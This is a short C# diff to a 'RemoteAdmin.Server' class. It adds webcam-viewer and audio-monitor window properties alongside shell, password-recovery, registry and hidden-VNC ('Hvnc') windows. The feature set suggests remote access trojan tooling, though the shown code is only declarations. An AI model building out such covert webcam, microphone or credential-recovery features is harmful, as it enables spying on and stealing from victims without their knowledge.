@@ -22,13 +22,13 @@ namespace RemoteAdmin.Server
         public ShellWindow? ShellWindow { get; set; }
         public TaskManagerWindow? TaskManagerWindow { get; set; }
         public FileManagerWindow? FileManagerWindow { get; set; }
-
+        public WebcamViewerWindow? WebcamViewerWindow { get; set; }
+        public AudioMonitorWindow? AudioMonitorWindow { get; set; }
         public RemoteDesktopWindow? RemoteDesktopWindow { get; set; }
         public RegistryEditorWindow Registryeditorwindow { get; set; }
         public Passwordrecoverywindow? PasswordRecoveryWindow { get; set; }
 
         public event PropertyChangedEventHandler PropertyChanged;
-
         public TaskSchedulerWindow TaskSchedulerWindow { get; set; }
         public string PendingTaskExport { get; set; }
         public Hvnc? HvncWindow { get; set; }
